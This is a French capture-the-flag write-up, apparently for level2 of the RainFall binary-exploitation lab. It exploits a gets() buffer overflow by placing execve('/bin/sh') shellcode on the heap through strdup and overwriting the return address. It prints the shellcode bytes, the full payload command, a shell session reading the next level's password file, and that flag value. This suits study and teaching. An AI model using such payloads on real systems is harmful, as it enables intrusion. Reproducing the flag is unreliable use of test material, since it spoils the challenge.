Bon cette fois c'est un peu plus complique...

En ouvrant avec GDB on voit que le programme appelle la fonction `p`  
Cette fonction utilise la fonction `gets` donc vulnérable a un buffer overflow  
Juste avant il y a un buffer de 76 bytes qui est déclaré sur la stack  
Malheureusement pour nous, il y a une verification juste apres qui verifie que la fonction `p` ne renvoie pas sur la stack  
Donc on ne peut pas utiliser de shellcode sur la stack  

Cependant, on peut se servir de la heap pour stocker notre shellcode car le programme fait un `strdup` de la chaine passee a `gets`  
Ainsi, on peut recuperer un shellcode sur un site comme [shell-storm](http://shell-storm.org/shellcode/),  
le passer a `gets` pour qu'il soit copie sur la heap et ensuite ecraser l'adresse de retour de `p` pour qu'elle pointe sur notre shellcode

J'ai choisi un shellcode qui appelle `execve` avec `/bin/sh` en argument [ici](https://shell-storm.org/shellcode/files/shellcode-811.html)  
`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80` (28 octets)

Derniere chose, il nous faut l'addresse sur la heap de notre shellcode pour pouvoir l'executer.  
On peut le faire avec `ltrace` pour voir l'adresse de la chaine copiee sur la heap

INFO: `ltrace` est un outil qui permet de tracer les appels a des fonctions de librairies dynamiques (comme `strdup` par exemple)

```bash
level2@RainFall:~$ echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff804, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                                   = 0
gets(0xbffff70c, 0, 0, 0xb7e5ec73, 0x80482b5)                                        = 0xbffff70c
puts("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
)                                                                                    = 32
strdup("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")                                            = 0x0804a008                                                                                                                                   = 0x0804a008
+++ exited (status 8) +++
```

On voit que l'adresse de notre chaine est `0x0804a008` soit `0x08a00408` en little endian

Du coup on peut faire notre exploit:
1. On envoie notre shellcode de 28 bytes
2. On envoie (76 + 4) - 28 = 52 bytes au pif (0x42 a tout hasard) pour remplir le buffer
3. On envoie l'adresse de notre shellcode sur la heap pour ecraser l'adresse de retour de `p`

```bash
level2@RainFall:~$ python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x42"*52 + "\x08\xa0\x04\x08"' > /tmp/payload2
level2@RainFall:~$ cat /tmp/payload2 - | ./level2
1�Ph//shh/bin����°
                  ̀1�@̀BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB�
pwd
/home/user/level2
id
uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

Une bonne video sur le sujet:
[Running a Buffer Overflow Attack - Computerphile](https://www.youtube.com/watch?v=1S0aBV-Waeo)